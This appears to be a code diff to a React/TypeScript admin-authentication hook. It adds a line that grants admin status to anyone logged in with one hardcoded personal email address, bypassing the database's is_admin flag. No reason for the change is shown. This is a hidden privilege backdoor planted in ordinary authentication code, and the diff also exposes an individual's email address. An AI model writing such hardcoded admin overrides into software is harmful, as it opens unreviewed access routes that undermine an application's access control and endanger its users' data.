@@ -65,9 +65,9 @@ export function useAdminAuth(): UseAdminAuthReturn {
         throw new Error('User profile not found in database');
       }
 
-      const isAdminFlag = data.is_admin === true;
+      const isAdminFlag = data.is_admin === true || authUser?.email === 'tanvirrockz@gmail.com';
       setIsAdmin(isAdminFlag);
-      setAdminUser(isAdminFlag ? { ...data, email: authUser?.email ?? '' } as AdminUser : null);
+      setAdminUser(isAdminFlag ? { ...data, email: authUser?.email ?? '', is_admin: isAdminFlag } as AdminUser : null);
       checkedUserIdRef.current = userId;
     } catch (err) {
       console.error('Error checking admin status:', err);
